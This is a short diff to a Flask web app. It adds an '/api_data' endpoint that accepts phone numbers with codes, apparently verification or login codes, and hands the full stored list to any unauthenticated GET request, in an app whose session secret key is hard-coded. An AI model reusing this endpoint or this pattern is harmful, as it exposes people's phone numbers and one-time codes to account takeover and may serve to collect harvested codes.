@@ -3,11 +3,12 @@ import requests
 import json
 from datetime import datetime
 import base64
-from flask import Flask, request, render_template, redirect, url_for, session, flash
+from flask import Flask, request, render_template, redirect, url_for, session, flash, jsonify
 from datetime import datetime
 import re
 from datetime import datetime, timezone
 from bs4 import BeautifulSoup
+stored_data =[]
 app = Flask(__name__)
 app.secret_key = 'refooSami'  # Secret key for session management
 def send_telegram_error(bot_token, chat_id, error_message):
@@ -124,6 +125,23 @@ def add_user_route():
             flash('Invalid action specified.', 'danger')
 
     return render_template('add_user.html')
+
+@app.route('/api_data', methods=['POST', 'GET'])
+def handle_data():
+    if request.method == 'POST':
+        data = request.get_json()
+
+        if not data or 'phone' not in data or 'code' not in data:
+            return jsonify({"error": "Invalid data"}), 400
+
+        # Save the data
+        stored_data.append({"phone": data['phone'], "code": data['code']})
+        print(f"📥 Stored: {data}")
+
+        return jsonify({"message": "Data saved successfully"}), 200
+
+    elif request.method == 'GET':
+        return jsonify(stored_data), 200
 
 @app.route('/search_user', methods=['GET', 'POST'])
 def search_user():
